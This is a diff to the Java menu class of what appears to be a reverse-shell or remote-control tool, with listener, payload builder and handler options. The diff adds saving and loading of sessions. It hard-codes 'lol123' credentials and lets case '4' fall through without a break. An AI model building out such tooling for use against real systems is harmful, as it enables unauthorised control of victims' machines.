@@ -28,12 +28,13 @@ public class Revsni {
     public static volatile boolean activeHelper = true;
     public static Thread serverino = null;
     public static volatile ThreadMonitor threadMonitor = new ThreadMonitor();
-    public static int sessionNumber = 0;
+    public static int sessionNumberStart = 1;
+    public static boolean loaded = false;
+    public static Server servero = null;
 
 
     private static Configuration configuration = new Configuration();
     public static void main(String[] args) throws IOException {
-        Server servero = null;
         
         System.out.println("\n"
                           +"-----------"
@@ -44,6 +45,8 @@ public class Revsni {
                           +"1. Edit Host and Payload Configuration\n"
                           +"2. Start a Listener and Handler / Foreground if already active\n"
                           +"3. Start the Builder\n"
+                          +"4. Save Sessions to a File\n"
+                          +"5. Load Sessions from a File\n"
                           +"\n"
                           +"Type 'exit' to leave\n"
                           +"\n");
@@ -59,8 +62,7 @@ public class Revsni {
                     if(servero == null) {
                         try {
                             configuration.getMode();
-                            sessionNumber++;
-                            servero = new Server(Mode.TCP.lHost, Mode.TCP.lPort, "lol123", "lol123", threadMonitor, sessionNumber);
+                            servero = new Server(Mode.TCP.lHost, Mode.TCP.lPort, "lol123", "lol123", threadMonitor, sessionNumberStart, loaded);
                         } catch (NoSuchAlgorithmException | InvalidKeySpecException e1) {
                             servero = null;
                         }
@@ -70,6 +72,51 @@ public class Revsni {
                     e.printStackTrace();
                 } break;
             case("3"): break;
+            case("4"): 
+                if(servero == null) {
+                    System.out.println("Please start a Listener first before you want to save sessions.");
+                } else if(serverino != null && serverino.getState().equals(Thread.State.WAITING)) {
+                    System.out.print("Specify a filename to save sessions (leave empty for standard name): ");
+                    String name = bufferedReader.readLine();
+                    if(name.equals("")) {
+                        servero.saveSessions();
+                        break;
+                    } else {
+                        servero.saveSessions(name);
+                        break;
+                    }
+                }
+            case("5"): 
+                System.out.print("Specify a filename to load sessions (leave empty for standard name): ");
+                String name = bufferedReader.readLine();
+                try {
+                    servero = new Server(Mode.TCP.lHost, Mode.TCP.lPort, "lol123", "lol123", threadMonitor, sessionNumberStart, true);
+                } catch (NoSuchAlgorithmException | InvalidKeySpecException e1) {
+                    // TODO Auto-generated catch block
+                    e1.printStackTrace();
+                }
+                if(name.equals("")) {
+                    if(servero.loadSessions()) {
+                        loaded = true;
+                    } else {
+                        loaded = false;
+                    }
+                    
+                } else {
+                    if(servero.loadSessions(name)) {
+                        loaded = true;
+                    } else {
+                        loaded = false;
+                    }
+                }
+                if(loaded) {
+                    try {
+                        listenHandle(servero);
+                    } catch (NoSuchAlgorithmException | InvalidKeySpecException e) {
+                        
+                    }
+                }
+                break;
             case("exit"): System.exit(1); break;
             default:
         }
